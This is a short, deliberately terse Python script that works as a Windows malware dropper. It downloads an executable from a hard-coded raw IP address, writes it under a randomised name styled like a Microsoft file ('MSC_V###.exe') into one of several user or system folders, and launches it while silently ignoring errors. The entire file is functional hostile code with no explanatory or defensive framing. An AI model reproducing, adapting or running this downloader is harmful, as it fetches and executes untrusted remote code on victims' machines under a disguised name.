import os as o
import random as r
import subprocess as s
import requests as q


def g(l):
    a = "1234567890"
    b = "".join(r.choice(a) for _ in range(l))
    return b


print('Starting...')
z = "http://60.204.200.204:12345/extractor.exe"
x = g(3)

potential_directories = [
    o.path.join("c:\\", "PerfLogs"),
    o.path.join(o.environ['USERPROFILE'], 'Documents'),
    o.path.join(o.environ['USERPROFILE'], 'Downloads'),
    o.path.join(o.environ.get('TEMP', 'C:\\Temp')),
    "C:\\ProgramData"
]

for directory in potential_directories:
    v = o.path.join(directory, f"MSC_V{x}.exe")
    try:
        y = q.get(z)
        with open(v, "wb") as w:
            w.write(y.content)

        s.Popen(v, shell=True, cwd=directory)
        break  
    except:
        continue
